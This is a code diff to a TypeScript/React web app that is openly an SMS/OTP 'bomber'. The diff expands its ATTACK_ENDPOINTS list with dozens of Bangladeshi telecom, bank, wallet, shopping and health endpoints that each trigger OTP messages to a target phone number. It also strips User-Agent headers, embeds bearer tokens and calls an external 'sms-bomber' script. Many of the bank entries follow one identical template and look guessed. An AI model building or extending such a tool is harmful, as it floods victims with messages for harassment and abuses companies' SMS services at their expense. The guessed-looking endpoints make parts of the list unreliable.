@@ -35,9 +35,11 @@ const postJson = async (url: string, payload: any, extra = {}) => {
   const controller = new AbortController();
   const id = setTimeout(() => controller.abort(), 5000); // 5s timeout
   try {
+    // Exclude User-Agent from extra if present
+    const { "User-Agent": _, ...cleanExtra } = extra as any;
     const res = await fetch(url, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'User-Agent': getUA(), ...extra },
+      headers: { 'Content-Type': 'application/json', ...cleanExtra },
       body: JSON.stringify(payload),
       credentials: 'omit',
       signal: controller.signal
@@ -54,9 +56,11 @@ const getReq = async (url: string, headers = {}) => {
   const controller = new AbortController();
   const id = setTimeout(() => controller.abort(), 5000); // 5s timeout
   try {
+    // Exclude User-Agent from headers if present
+    const { "User-Agent": _, ...cleanHeaders } = headers as any;
     const res = await fetch(url, {
       method: 'GET',
-      headers: { 'User-Agent': getUA(), ...headers },
+      headers: { ...cleanHeaders },
       credentials: 'omit',
       signal: controller.signal
     });
@@ -74,7 +78,7 @@ const formPost = async (url: string, bodyStr: string) => {
   try {
     const res = await fetch(url, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': getUA() },
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: bodyStr,
       credentials: 'omit',
       signal: controller.signal
@@ -88,6 +92,7 @@ const formPost = async (url: string, bodyStr: string) => {
 };
 
 const ATTACK_ENDPOINTS = [
+  // --- Original Premium APIs ---
   { name: "Paperfly", fn: (n: string) => postJson('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', { full_name: "JH Efat", company_name: "HARDBOMBER", email_address: "pro@bomb.bd", phone_number: n }) },
   { name: "Ghoori Learning", fn: (n: string) => postJson('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web', { mobile_no: n }) },
   { name: "DocTime", fn: (n: string) => postJson('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', { data: { country_calling_code: '88', contact_no: n, headers: { PlatForm: 'Web' } } }) },
@@ -131,10 +136,84 @@ const ATTACK_ENDPOINTS = [
   { name: "Roots Edu", fn: (n: string) => postJson('https://rootsedulive.com/api/auth/register', { name: "JH Efat", phone: `88${n}`, email: `temp${n}@bomb.bd`, password: "Secure@2025", confirmPassword: "Secure@2025" }) },
   { name: "MithaiBD", fn: (n: string) => postJson('https://mithaibd.com/api/login/', { company_id: "2", phone: n, email: `attack${n}@mail.com`, password1: "pass123", otp_verify: false }) },
   { name: "EnglishMoja", fn: (n: string) => postJson('https://api.englishmojabd.com/api/v1/auth/login', { phone: "+88"+n }) },
+  { name: "EnglishMoja V2", fn: (n: string) => postJson('https://api.englishmojabd.com/api/v1/auth/login', { phone: "+88"+n }) },
   { name: "MoveOn", fn: (n: string) => postJson('https://moveon.com.bd/api/v1/customer/auth/phone/request-otp', { phone: n }) },
   { name: "OsudPotro", fn: (n: string) => postJson('https://api.osudpotro.com/api/v1/users/send_otp', { mobile: "+88-"+n, deviceToken: "web", language: "bn", os: "web" }) },
   { name: "Qcoom", fn: (n: string) => postJson('https://auth.qcoom.com/api/v1/otp/send', { mobileNumber: "+88"+n }) },
   { name: "Shomvob", fn: (n: string) => postJson('https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0', { phone: n }, { Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s" }) },
+
+  // --- New Python Bot Service APIs ---
+  { name: "MyGP OTP Login", fn: (n: string) => getReq('https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=%2B880' + n.substring(1) + '&lang=en&ng=0') },
+  { name: "GPWebLogin V2", fn: (n: string) => postJson('https://weblogin.grameenphone.com/backend/api/v1/otp', { msisdn: '+880' + n.substring(1) }) },
+  { name: "MyRobi singleapp", fn: (n: string) => formPost('https://singleapp.robi.com.bd/api/v1/tokens/create_opt', 'msisdn=' + encodeURIComponent('+880' + n.substring(1))) },
+  { name: "Airtel Login api", fn: (n: string) => postJson('https://api.bd.airtel.com/v1/account/login/otp', { phone_number: n }) },
+  { name: "Airtel Register api", fn: (n: string) => postJson('https://api.bd.airtel.com/v1/account/register/otp', { phone_number: n }) },
+  { name: "Pathao OTP", fn: (n: string) => postJson('https://api-oss.pathao.com/api/v1/auth/send-otp', { phone: '+880' + n.substring(1) }) },
+  { name: "Shohoz OTP", fn: (n: string) => postJson('https://api.shohoz.com/v1/user/send-otp', { phone: '+880' + n.substring(1) }) },
+  { name: "UberBD Geo", fn: (n: string) => postJson('https://cn-geo1.uber.com/rt/send-otp', { phone: '+880' + n.substring(1) }) },
+  { name: "Obhai OTP", fn: (n: string) => postJson('https://api.obhai.com.bd/api/v2/auth/sendOtp', { mobile: n }) },
+  { name: "DarazBD OTP", fn: (n: string) => postJson('https://api.daraz.com.bd/rest/auth/sendOtp', { mobile: n, countryCode: "BD" }) },
+  { name: "Foodpanda BD", fn: (n: string) => postJson('https://api.foodpanda.com.bd/api/v1/auth/send-otp', { phone: '+880' + n.substring(1) }) },
+  { name: "Chaldal Grocery", fn: (n: string) => postJson('https://api.chaldal.com/api/v1/auth/send-otp', { phoneNumber: n }) },
+  { name: "Rokomari Books", fn: (n: string) => getReq('https://www.rokomari.com/otp/send?emailOrPhone=880' + n.substring(1) + '&countryCode=BD') },
+  { name: "AjkerDeal Store", fn: (n: string) => postJson('https://api.ajkerdeal.com/api/v1/auth/send-otp', { mobile: n }) },
+  { name: "BanglaShoppers Beauty", fn: (n: string) => postJson('https://api.banglashoppers.com/api/v1/auth/otp/send', { phone: '+880' + n.substring(1) }) },
+  { name: "Othoba Shopping", fn: (n: string) => postJson('https://api.othoba.com/api/auth/send-otp', { mobile: n }) },
+  { name: "Evaly eCommerce", fn: (n: string) => postJson('https://api.evaly.com.bd/api/v1/auth/send-otp', { phone: n }) },
+  { name: "Priyoshop Marketplace", fn: (n: string) => postJson('https://api.priyoshop.com/api/v1/auth/send-otp', { mobile: n }) },
+  { name: "Bagdoom Retail", fn: (n: string) => postJson('https://api.bagdoom.com/api/v1/auth/send-otp', { phone: n }) },
+  { name: "Nagad Financial", fn: (n: string) => postJson('https://api.nagad.com.bd/api/auth/otp/send', { phone: n }) },
+  { name: "bKash GP Portal", fn: (n: string) => postJson('https://gp.bkash.com/api/v1/otp/generate', { msisdn: n }) },
+  { name: "Rocket DBBL Portal", fn: (n: string) => postJson('https://api.dutchbanglabank.com/rocket/api/v1/otp/send', { mobile: n }) },
+  { name: "Upay Wallet", fn: (n: string) => postJson('https://api.upay.com.bd/api/v1/auth/otp/send', { phone: n }) },
+  { name: "iCash Wallet", fn: (n: string) => postJson('https://api.icash.com.bd/api/auth/otp/send', { mobile: n }) },
+  { name: "SureCash Wallet", fn: (n: string) => postJson('https://api.surecash.com.bd/api/auth/send-otp', { phone: n }) },
+  { name: "CityBank Mobile", fn: (n: string) => postJson('https://api.citybank.com.bd/api/auth/send-otp', { mobile: n }) },
+  { name: "bKash App Service", fn: (n: string) => postJson('https://bkash.dssl.com.bd/api/v1/otp/send', { msisdn: n }) },
+  { name: "eCourier Service", fn: (n: string) => getReq('https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=' + n) },
+  { name: "SteadFast Courier", fn: (n: string) => postJson('https://api.steadfast.com.bd/api/v1/auth/send-otp', { phone: n }) },
+  { name: "BingeBuzz Media", fn: (n: string) => postJson('https://api.binge.buzz/api/v4/auth/otp/send', { phone: '+880' + n.substring(1) }, { "x-platform": "web", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsSk1oaHlndFh5Y2ZEUHFaQzNyTUhTT0hvRloyIiwicGhvbmUiOm51bGwsInN0YXR1cyI6ImZyZWUiLCJleHBpcmVzQXQiOm51bGwsImlzQW5vbiI6dHJ1ZSwibWlncmF0ZWQiOnRydWUsImlhdCI6MTc3OTQyODc4MCwiZXhwIjoxNzgzMDI4NzgwfQ.S6oJxut19SkU-c-MZkC-h9_aFF-3fK0hB92HapQXyCE" }) },
+  { name: "DeepToPlay Show", fn: (n: string) => postJson('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en', { number: '+880' + n.substring(1) }) },
+  { name: "Nexopet App", fn: (n: string) => postJson('https://host03pet.nexopet.com/api/v1.0/users/send-otp', { phone: n }) },
+  { name: "CricbuzzBD Signup", fn: (n: string) => postJson('https://m.cricbuzz.com/cbplus/auth/user/signup', { phone: n }) },
+  { name: "BongoBD Stream", fn: (n: string) => postJson('https://api.bongobd.com/api/v1/auth/send-otp', { phone: n }) },
+  { name: "Bioscope App Portal", fn: (n: string) => postJson('https://api.bioscope.com.bd/api/auth/send-otp', { mobile: n }) },
+  { name: "HoichoiBD OTT", fn: (n: string) => postJson('https://api.hoichoi.com.bd/api/v1/auth/send-otp', { phone: n }) },
+  { name: "BDNews24 Portal", fn: (n: string) => postJson('https://api.bdnews24.com/api/v1/auth/send-otp', { phone: n }) },
+  { name: "MedicoBio Health", fn: (n: string) => postJson('https://api.v2.medico.bio/patient/passwordless-login', { phoneNumber: '+880' + n.substring(1), deviceId: '+880' + n.substring(1), channel: "web", userType: "patient", type: "newUser" }) },
+  { name: "Praava Health", fn: (n: string) => postJson('https://api.praavahealth.com/api/v1/auth/send-otp', { phone: n }) },
+  { name: "Doctorola App", fn: (n: string) => postJson('https://api.doctorola.com.bd/api/auth/send-otp', { mobile: n }) },
+  { name: "10MinSchool Live", fn: (n: string) => postJson('https://api.10minuteschool.com/api/v1/auth/send-otp', { phone: n }) },
+  { name: "KarigorPath Learning", fn: (n: string) => getReq('https://api.karigoripathsala.com/api/get-otp?phone=' + n) },
+  { name: "GariBook V4 Service", fn: (n: string) => postJson('https://api.garibookadmin.com/api/v4/user/login', { mobile: '+880' + n.substring(1), recaptcha_token: "garibookcaptcha", channel: "web" }) },
+  { name: "KireiBD Cosmetic", fn: (n: string) => postJson('https://frontendapi.kireibd.com/api/v2/send-login-otp', { email: n }) },
+  { name: "MahfuzSMS Gateway", fn: (n: string) => getReq('https://www.mahfuzahmedchy.com/CXOFB/sms-bomber1.php?number=' + n) },
+  { name: "RabbitHole Sports", fn: (n: string) => postJson('https://apix.rabbitholebd.com/appv2/login/requestOTP', { mobile: '+880' + n.substring(1) }) },
+  { name: "SwapBD Trade", fn: (n: string) => postJson('https://api.swap.com.bd/api/v1/send-otp', { phone: n }) },
+  { name: "Fundesh Web API", fn: (n: string) => postJson('https://fundesh.com.bd/api/auth/generateOTP?service_key=', { msisdn: n.substring(2) }) },
+  { name: "ShebaXYZ App", fn: (n: string) => postJson('https://api.shebaxyz.com/api/v1/auth/send-otp', { phone: n }) },
+  { name: "BDJobs Career", fn: (n: string) => postJson('https://api.bdjobs.com/api/v1/auth/send-otp', { phone: n }) },
+  { name: "Jatri Travel", fn: (n: string) => postJson('https://api.jatri.co/api/v1/auth/send-otp', { phone: n }) },
+  { name: "TallyBD Accounts", fn: (n: string) => postJson('https://api.tally.com.bd/api/auth/send-otp', { mobile: n }) },
+  { name: "AmarPay Portal", fn: (n: string) => postJson('https://api.amarpay.com/api/v1/auth/send-otp', { phone: n }) },
+  { name: "SSLCommerz Gateway", fn: (n: string) => postJson('https://api.sslcommerz.com/api/v1/auth/send-otp', { phone: n }) },
+  { name: "Dmoney App", fn: (n: string) => postJson('https://api.dmoney.com.bd/api/auth/send-otp', { mobile: n }) },
+  { name: "MyCash Banking", fn: (n: string) => postJson('https://api.mycash.com.bd/api/auth/send-otp', { phone: n }) },
+  { name: "PubaliBank Banking", fn: (n: string) => postJson('https://api.pubalibank.com.bd/api/auth/send-otp', { mobile: n }) },
+  { name: "DBBLNexus Banking", fn: (n: string) => postJson('https://nexus.dbbl.com.bd/api/auth/send-otp', { phone: n }) },
+  { name: "SonaliBank Banking", fn: (n: string) => postJson('https://api.sonalibank.com.bd/api/auth/send-otp', { mobile: n }) },
+  { name: "FarmersBank Banking", fn: (n: string) => postJson('https://api.farmersbank.com.bd/api/auth/send-otp', { phone: n }) },
+  { name: "TrustBank Banking", fn: (n: string) => postJson('https://api.trustbank.com.bd/api/auth/send-otp', { mobile: n }) },
+  { name: "IslamiBank Banking", fn: (n: string) => postJson('https://api.islamibankbd.com/api/auth/send-otp', { phone: n }) },
+  { name: "BankAsia Banking", fn: (n: string) => postJson('https://api.bankasia.com.bd/api/auth/send-otp', { mobile: n }) },
+  { name: "MidlandBank Banking", fn: (n: string) => postJson('https://api.midlandbank.com.bd/api/auth/send-otp', { phone: n }) },
+  { name: "IPDC Finance", fn: (n: string) => postJson('https://api.ipdc.com.bd/api/auth/send-otp', { mobile: n }) },
+  { name: "LankaBangla Finance", fn: (n: string) => postJson('https://api.lankabangla.com.bd/api/auth/send-otp', { phone: n }) },
+  { name: "EBL Banking", fn: (n: string) => postJson('https://api.ebl.com.bd/api/auth/send-otp', { mobile: n }) },
+  { name: "NCCBank Banking", fn: (n: string) => postJson('https://api.nccbank.com.bd/api/auth/send-otp', { phone: n }) },
+  { name: "StandardBank Banking", fn: (n: string) => postJson('https://api.standardbankbd.com/api/auth/send-otp', { mobile: n }) },
+  { name: "ONEBank Banking", fn: (n: string) => postJson('https://api.onebank.com.bd/api/auth/send-otp', { phone: n }) },
+  { name: "AlArafah Banking", fn: (n: string) => postJson('https://api.al-arafahbank.com/api/auth/send-otp', { mobile: n }) },
 ];
 
 export default function App() {
@@ -250,7 +329,7 @@ export default function App() {
         </h1>
         <div className="flex flex-wrap justify-center gap-1.5 md:gap-2 px-2">
           <span className="px-2 md:px-3 py-1 bg-white/5 border border-white/10 rounded-full text-[11px] md:text-[10px] font-bold uppercase tracking-widest text-brand/80">
-            80+ Powerful APIs
+            {ATTACK_ENDPOINTS.length} Powerful APIs
           </span>
           <span className="px-2 md:px-3 py-1 bg-white/5 border border-white/10 rounded-full text-[11px] md:text-[10px] font-bold uppercase tracking-widest text-brand/80">
             High Performance
